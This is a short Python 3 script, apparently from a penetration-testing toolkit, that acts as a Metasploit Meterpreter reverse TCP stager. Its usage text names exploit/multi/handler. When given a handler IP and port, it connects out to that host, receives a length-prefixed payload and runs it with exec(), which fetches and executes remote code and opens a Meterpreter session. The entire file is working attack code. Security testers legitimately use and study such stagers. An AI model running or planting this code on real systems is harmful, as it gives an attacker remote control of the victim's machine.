#!/usr/bin/python
#
# msf-meterpreter-reverse_tcp.py - Python 3 version 0.1
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#

import socket,struct
import sys
import datetime

i = datetime.datetime.today()

instructions = 	"msf-meterpreter-reverse_tcp.py ( https://github.com/attackdebris/babel-sf )\n" +\
		"\n[This script should be used with msf: exploit/multi/handler > payload: python/meterpreter/reverse_tcp]\n" +\
		"\nUsage:" +\
		"\n  python msf-meterpreter-reverse_tcp.py [remote handler IP] [port]" +\
		"\n  e.g. python msf-meterpreter-reverse_tcp.py 192.168.0.1 4444"

if len(sys.argv) <3:
	print (instructions)
elif len(sys.argv) >3:
	print ("Too many arguments, check your syntax.")
elif len(sys.argv) ==3:
	port=int(sys.argv[2])
	host=sys.argv[1]
	s=socket.socket(2,1)
	s.connect ((host, port))
	print ("Starting msf-meterpreter-reverse_tcp.py ( https://github.com/attackdebris/babel-sf ) at %s-%s-%s %s:%s" % (i.year, i.month, i.day, i.hour, i.minute))
	print ("Connecting to %s on TCP port %s...." % (host, port))
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(4096)
	while len(d)!=l:
	  d+=s.recv(4096)
	exec(d,{'s':s})
